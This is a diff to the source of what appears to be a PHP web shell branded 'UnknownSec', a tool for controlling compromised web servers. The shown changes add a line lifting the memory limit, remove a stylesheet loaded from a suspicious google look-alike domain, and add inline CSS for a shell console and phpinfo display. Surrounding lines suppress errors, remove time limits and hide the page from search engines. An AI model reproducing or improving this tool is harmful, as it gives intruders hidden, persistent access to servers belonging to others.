@@ -7,6 +7,7 @@ error_reporting(0);
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
+@ini_set("memory_limit", 0);
 date_default_timezone_set('Asia/Jakarta');
 $_n = 'UnknownSec';
 $_s = "<style>table{display:none;}</style><div class='table-responsive'><hr></div>";
@@ -110,10 +111,141 @@ echo "
 		<meta name='robots' content='noindex,nofollow'>
 		<title>".$_SERVER['HTTP_HOST']." - $_n</title>
 		<meta name='viewport' content='width=device-width, initial-scale=0.70'>
-		<link rel='stylesheet' href='//meki.google.co.ws/style.css'>
 		<script src='//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
 		<script src='//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
 		<script src='//code.jquery.com/jquery-3.3.1.slim.min.js'></script>
+		<style>
+			@import url('https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css');
+			@import url('https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css');
+			@import url('https://cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/themes/prism-okaidia.css');
+			@import url('https://fonts.googleapis.com/css2?family=Ubuntu+Condensed');
+			@import url('https://fonts.googleapis.com/css2?family=Cormorant');
+			
+			body {
+			font-family: 'Ubuntu Condensed';
+			}
+			
+			.shell {
+			border-radius: 4px;
+			border: 1px solid rgba(255, 255, 255, 0.4);
+			font-size: 10pt;
+			display: flex;
+			flex-direction: column;
+			align-items: stretch;
+			background: #242424;
+			color: #fff;
+			}
+			
+			.pre {
+			height: 150px;
+			overflow: auto;
+			white-space: pre-wrap;
+			flex-grow: 1;
+			margin: 10px auto;
+			padding: 10px;
+			line-height: 1.3em;
+			overflow-x: scroll;
+			}
+			
+			.anu,
+			kbd {
+			font-family: 'Cormorant';
+			}
+			
+			.corner {
+			text-align: right;
+			margin-top: -10px;
+			font-size: 12px;
+			}
+			
+			gr {
+			color: green;
+			}
+			
+			rd {
+			color: red;
+			}
+			
+			.php_info pre {
+			margin: 0;
+			font-family: monospace;
+			}
+			
+			.php_info table {
+			color: #000;
+			border-collapse: collapse;
+			border: 0;
+			width: 934px;
+			box-shadow: 1px 2px 3px #ccc;
+			}
+			
+			.center {
+			text-align: center;
+			}
+			
+			.center table {
+			margin: 1em auto;
+			text-align: left;
+			}
+			
+			.center th {
+			text-align: center !important;
+			}
+			
+			.php_info td,
+			th {
+			border: 1px solid #666;
+			font-size: 75%;
+			vertical-align: baseline;
+			padding: 4px 5px;
+			}
+			
+			.p {
+			text-align: left;
+			}
+			
+			.e {
+			background-color: #ccf;
+			width: 300px;
+			font-weight: bold;
+			}
+			
+			.h {
+			background-color: #99c;
+			font-weight: bold;
+			}
+			
+			.v {
+			background-color: #ddd;
+			max-width: 300px;
+			overflow-x: auto;
+			word-wrap: break-word;
+			}
+			
+			.v i {
+			color: #999;
+			}
+			
+			img {
+			float: right;
+			border: 0;
+			}
+			
+			hr {
+			width: 934px;
+			background-color: #ccc;
+			border: 0;
+			height: 1px;
+			}
+			
+			h1 {
+			font-size: 150%;
+			}
+			
+			h2 {
+			font-size: 125%;
+			}
+		</style>
 	</head>
 <body class='bg-secondary text-light'>
 <div class='container-fluid'>
